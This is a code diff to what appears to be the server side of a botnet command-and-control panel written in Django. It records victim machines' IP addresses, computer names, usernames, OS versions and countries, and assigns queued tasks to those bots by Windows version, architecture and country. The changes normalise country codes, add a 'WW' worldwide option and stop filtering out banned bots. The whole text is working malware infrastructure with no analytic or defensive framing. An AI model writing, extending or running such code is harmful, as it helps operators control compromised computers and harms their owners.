@@ -350,7 +350,7 @@ class Handlers:
                 except Exception as e:
                     print(e)
                     _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64,
-                               is_server=is_server, country=country, x_oc=x_oc)
+                               is_server=is_server, country=country.upper(), x_oc=x_oc)
 
                 if os_major == 10 and os_minor == 0 and not is_server:
                     _bot.is_win10 = True
@@ -393,7 +393,7 @@ class Handlers:
                 tasks = [task for task in Task.objects.all() if (xoc in task.xoc.split(':') or
                                                                  task.xoc == 'x32_64') and (
                                  task.winos == 'all_win' or task_win in task.winos.split(
-                             ':')) and task.personal is False and not task.completed and (_bot.country == task.country if task.country != '*' else True)]
+                             ':')) and task.personal is False and not task.completed and (_bot.country == task.country if task.country != 'WW' else True)]
 
                 for task in tasks:
                     _bot.tasks.add(task)
@@ -526,32 +526,31 @@ class Handlers:
         wins = [i for i in _true if 'win' in i or 'serv' in i]
         x_oc = [i for i in _true if 'x' in i]
 
-        print(wins)
 
         s = {
-            'win7': Bot.objects.filter(is_win7=True).filter(is_banned=False),
-            'win8': Bot.objects.filter(is_win8=True).filter(is_banned=False),
-            'win81': Bot.objects.filter(is_win81=True).filter(is_banned=False),
-            'win10_11': Bot.objects.filter(is_win10=True).filter(is_banned=False),
-            'serv2016_19': Bot.objects.filter(is_server2016_19=True).filter(is_banned=False),
-            'serv2012': Bot.objects.filter(is_server2012=True).filter(is_banned=False),
-            'serv2012r2': Bot.objects.filter(is_server2012r2=True).filter(is_banned=False),
-            'all_win': Bot.objects.filter(is_banned=False)
+            'win7': Bot.objects.filter(is_win7=True),
+            'win8': Bot.objects.filter(is_win8=True),
+            'win81': Bot.objects.filter(is_win81=True),
+            'win10_11': Bot.objects.filter(is_win10=True),
+            'serv2016_19': Bot.objects.filter(is_server2016_19=True),
+            'serv2012': Bot.objects.filter(is_server2012=True),
+            'serv2012r2': Bot.objects.filter(is_server2012r2=True),
+            'all_win': Bot.objects.all()
         }
 
         print(request.POST)
+        print(wins)
 
         bots = [s[win] for win in wins if len(s[win]) != 0]
         try:
             if 'x32_64' in x_oc:
-                _bots = [bot for bot in bots[0] if bot.is_banned is False and (bot.country == country if country != '*' else True)]
+                _bots = [bot for bot in bots[0] if (bot.country == country.upper() if country != 'WW' else True)]
             else:
-                _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc and bot.is_banned
-                         is False and (bot.country == country if country != '*' else True)]
+                _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc and (bot.country == country.upper() if country != 'WW' else True)]
         except:
             _bots = []
 
-        task = Task(name=name, country=country, type1=_type, winos=':'.join(wins), xoc=':'.join(x_oc),
+        task = Task(name=name, country=country.upper() if country != '*' else 'WW', type1=_type, winos=':'.join(wins), xoc=':'.join(x_oc),
                     repetitions=data['reps'],
                     done=0)
         task.save()
@@ -605,7 +604,7 @@ class Handlers:
         else:
             xoc = 'x32'
 
-        task = Task(name=name, personal=True, country=_bot.country, repetitions=1, done=0, winos=task_win, xoc=xoc,
+        task = Task(name=name, personal=True, country=_bot.country.upper(), repetitions=1, done=0, winos=task_win, xoc=xoc,
                     type1=_type)
         task.save()
 
